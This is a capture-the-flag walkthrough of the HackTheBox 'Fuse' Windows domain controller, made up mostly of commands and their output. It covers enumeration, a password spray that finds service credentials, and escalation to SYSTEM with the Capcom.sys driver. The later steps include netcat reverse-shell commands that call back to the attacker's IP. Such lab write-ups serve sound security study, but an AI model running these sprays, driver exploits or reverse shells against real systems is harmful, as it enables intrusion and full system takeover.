## Default Information
IP Address: 10.10.10.193\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.193    fuse.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.193 --rate=1000 -e tun0   
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-28 13:49:35 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 88/tcp on 10.10.10.193                                    
Discovered open port 3268/tcp on 10.10.10.193                                  
Discovered open port 389/tcp on 10.10.10.193                                   
Discovered open port 593/tcp on 10.10.10.193                                   
Discovered open port 53/tcp on 10.10.10.193                                    
Discovered open port 3269/tcp on 10.10.10.193                                  
Discovered open port 49675/tcp on 10.10.10.193                                 
Discovered open port 636/tcp on 10.10.10.193                                   
Discovered open port 139/tcp on 10.10.10.193                                   
Discovered open port 5985/tcp on 10.10.10.193                                  
Discovered open port 9389/tcp on 10.10.10.193                                  
Discovered open port 49667/tcp on 10.10.10.193                                 
Discovered open port 80/tcp on 10.10.10.193                                    
Discovered open port 49704/tcp on 10.10.10.193                                 
Discovered open port 135/tcp on 10.10.10.193                                   
Discovered open port 49676/tcp on 10.10.10.193                                 
Discovered open port 445/tcp on 10.10.10.193                                   
Discovered open port 49678/tcp on 10.10.10.193                                 
Discovered open port 49666/tcp on 10.10.10.193                                 
Discovered open port 464/tcp on 10.10.10.193                                   
Discovered open port 53/udp on 10.10.10.193 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

```
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-27 03:41:54Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49766/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```

From the nmap output, we are able to discover another domain, fabricorp.local. We will add this domain to our /etc/hosts file. 

```
10.10.10.193    fabricorp.local fuse.htb
```

### Testing for zone transfer vulnerabilities
Using the dig command, we realized that there is only 1 server associated with 10.10.10.193, but the server could not be reached.

```
┌──(kali㉿kali)-[~]
└─$ dig AXFR -p 53 @10.10.10.193

; <<>> DiG 9.17.19-3-Debian <<>> AXFR -p 53 @10.10.10.193
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached
```

Using the host command, we also realized that we are unable to make any connection to the server associated with 10.10.10.193

```
┌──(kali㉿kali)-[~]
└─$ host -t axfr 10.10.10.193                                                                                    9 ⨯
Trying "193.10.10.10.in-addr.arpa"
;; Connection to 192.168.147.2#53(192.168.147.2) for 193.10.10.10.in-addr.arpa. failed: connection refused.
Trying "193.10.10.10.in-addr.arpa"
;; Connection to 192.168.147.2#53(192.168.147.2) for 193.10.10.10.in-addr.arpa. failed: connection refused.
```
### Web Enumeration (Port 80)
Navigating to http://fuse.htb, we realize that we are redirected to http://fuse.fabricorp.local. However, we are not able to access http://fuse.fabricorp.local. As such, we would need to add fuse.fabricorp.local to our /etc/hosts file. 

```
10.10.10.193    fuse.fabricorp.local fabricorp.local fuse.htb
```

From http://fuse.fabricorp.local/papercut/logs/html/index.htm, we are able to download a few CSV files. From these CSV files, we are able to extract a list of users.

```
pmerton
tlavel
sthompson
bhult
administrator
```

### SMB Enumeration
Let us first try to enumerate the SMB server with null anuthentication using smbmap first. From the output, we are unable to authenticate using null authentication. 

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.193                         
[!] Authentication error on 10.10.10.193
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p "" -H 10.10.10.193
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p null -H 10.10.10.193
[!] Authentication error on 10.10.10.193
```

Next, we will use the list of users that we have obtained earlier and attempt to authenticate using a null password. Unforthunately, we are unable to authenticate with a null password.

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ crackmapexec smb 10.10.10.193 -u users.txt -p ""                                                             1 ⚙
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton: STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel: STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson: STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult: STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator: STATUS_LOGON_FAILURE 
```

Afterwards, let's try to test if the smb server is vulnerable to AS-REP Roasting attack. Unfortunately, all the users have Kerberos pre-authentication enabled and so we are unable to obtain the password hash.

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ ./script.sh                                                                                                  1 ⚙
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for pmerton
[-] User pmerton doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for tlavel
[-] User tlavel doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for sthompson
[-] User sthompson doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for bhult
[-] User bhult doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
```

Looks like, we would need to find a valid password for any of the user to be able to continue with our SMB enumeration. To do so, we will use cewl to generate a list of potential passwords from the website. In order to generate a more detailed wordlist, we will also be supplying ```--with-numbers``` argument to the cewl command.

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > pass.txt  
```

Next, we will use crackmapexec again to try and check if we are able to authenticate into the smb server with any of the set of credentials. From the output, what is interesting is that, using tlavel:Fabricorp01 or bhult:Fabricorp01, we are able to authenticate into the SMB server but we would need to change the password for the user.

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ crackmapexec smb 10.10.10.193 -u users.txt -p pass.txt --continue-on-success                     1 ⚙
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
```

Using smbclient on both sets of credentials, we realize that we obtain an error code that tells us to change the password for the users.

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.193 -U bhult  
Enter WORKGROUP\bhult's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.193 -U tlavel                                                                      1 ⨯
Enter WORKGROUP\tlavel's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

Next, we will change the password of the tlavel user using smbpasswd. Afterwards, we will enumerate the smb server with smbmap using the new set of credential. 

```
┌──(kali㉿kali)-[~]
└─$ sudo smbpasswd -r 10.10.10.193 tlavel             
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel on 10.10.10.193.

┌──(kali㉿kali)-[~]
└─$ smbmap -u tlavel -p "E123456789fg" -H 10.10.10.193
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

Enumerating the HP-MFT01 share, we are unable to find any meaningful information. Apart from that, enumerating the print$ share, we are also unable to find much meaningful information.

Next, we will move on to check using rpcclient. We will be able to authenticate into the rpcclient and enumerate the list of users and printers.

```
┌──(kali㉿kali)-[~]
└─$ rpcclient -U tlavel%fSK5tBoWyIi8c3iN9X7JVY6gopqzigXm 10.10.10.193                                            3 ⚙
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

Now that we have a list of users, and a potential password $fab@s3Rv1ce$1, we will use crackmapexec again to check if we are able to find a set of credentials that can authenticate. From there, we are able to find 2 set of credentials that can authenticate to the sm server.

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ crackmapexec smb 10.10.10.193 -u user.txt -p '$fab@s3Rv1ce$1' --continue-on-success                    148 ⨯ 1 ⚙
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True) 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1  
```

### Obtaining user flag

Using impacket-smbexec and impacket-psexec, we realize that we are unable to obtain a shell from it as we do not have write access to any of the shares. However, we are able to authenticate using evil-winrm. However, we realize that authentication via evil-winrm only works for the svc-print user but not for the svc-scan user.

```
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ bundle exec evil-winrm.rb -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'                             148 ⨯ 1 ⚙
*Evil-WinRM* PS C:\Users\svc-print\Documents> dir
```

Using the Evil-WinRM shell, we are able to obtain the user flag.

```
*Evil-WinRM* PS C:\Users\svc-print\Desktop> type user.txt
<Redacted user flag>
```

### Building EopLoadDriver.exe
First, we would need to create the vulnerable driver. To do so, we will have to build the C++ code from [here](https://github.com/TarlogicSecurity/EoPLoadDriver/). To compile the code, we would have to set the project to "Release" and "x64".

![release_x64](https://github.com/joelczk/writeups/blob/main/HTB/Images/Fuse/release_x64.png)

In the cpp code, the line ```include "stdafx.h"``` is a visual code artifact and has to be removed for the executable to be built properly.

### Building ExploitCapCom
In the C++ code for ExploitCapCom, the exploit will trigger a new shell with root privileges.

```
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

However, this is not what we want as we want to create a reverse shell payload with root privileges. Hence, we will replace the line with the following code:

```
TCHAR CommandLine[] = TEXT("C:\\test\\netcat.bat");
```

### Privilege Escalation to SYSTEM
First, let us download the Capcom.sys vulnerable driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys).

First, we would have to load the vulnerable Capcom driver using the EopLoadDriver.exe

```
*Evil-WinRM* PS C:\test> .\EopLoadDriver.exe System/CurrentControlSet\MyService C:\test\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System/CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
```

To create a reverse shell, we would need to upload nc.exe to our target machine as well as, netcat.bat file that will execute the reverse shell command. The contents of netcat.bat are as follows:

```
c:\temp\nc.exe 10.10.14.195 2222 -e cmd.exe
```

Next, we would have to upload the ExploitCapcom.exe binary to our target machine and execute it. Doing so, will spawn a reverse shell on our listener.

```
*Evil-WinRM* PS C:\test> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000206A8CB0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

### Obtaining root flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.193] 50238
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\test>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
## Post-Exploitation

### Creating ExploitCapcom.exe binary

Another way of creating the binary that will spawn a reverse shell would be to modify the code into the following line:

```
TCHAR CommandLine[] = TEXT("nc.exe -e C:\\Windows\\system32\\cmd.exe 10.10.16.8 4000");
```

One thing to note is that we would need to specify the complete path of ```C:\\Windows\\system32\cmd.exe``` for the exploit to work. Using cmd.exe instead will cause the exploit to fail.

```
*Evil-WinRM* PS C:\test> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000023F3B8D0008
[+] Shellcode was executed
[+] Token stealing was successful
[-] CreateProcess() failed
```
### Reason why impacket-smbexec and imapacket-psexec failed
The reason why we are unable to connect via impacket-smbexec is due to the fact that svc-scan and svc-print do not have write access to any of the shares.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u svc-scan -p '$fab@s3Rv1ce$1' -H 10.10.10.193
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
┌──(kali㉿kali)-[~]
└─$ smbmap -u svc-print -p '$fab@s3Rv1ce$1' -H 10.10.10.193
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share         
```

Similarly, impacket-psexec failed to work for the same reason. 

```
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ impacket-psexec fabricorp.local/svc-print@10.10.10.193
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.193.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'print$' is not writable.
[-] share 'SYSVOL' is not writable.
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/fuse]
└─$ impacket-psexec fabricorp.local/svc-scan@10.10.10.193
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.193.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'print$' is not writable.
[-] share 'SYSVOL' is not writable.
```
